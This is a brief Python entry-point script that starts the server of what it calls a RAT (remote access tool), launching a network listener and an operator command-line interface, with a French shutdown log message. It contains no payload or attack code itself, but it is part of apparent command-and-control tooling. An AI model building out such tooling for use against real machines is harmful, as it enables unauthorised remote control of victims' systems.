from src.utils.logger import setup_logger
from src.utils.config import DEFAULT_HOST, DEFAULT_PORT
from src.server.server import RATServer
from src.server.network.listener import Listener
from src.server.cli import CLI

log = setup_logger("server.main")


def run_server(host=None, port=None):
    host = host or DEFAULT_HOST
    port = port or DEFAULT_PORT

    srv = RATServer()
    listener = Listener(srv, host=host, port=port)
    listener.start()

    cli = CLI(srv)
    try:
        cli.run()
    finally:
        listener.stop()
        log.info("Serveur arrete")
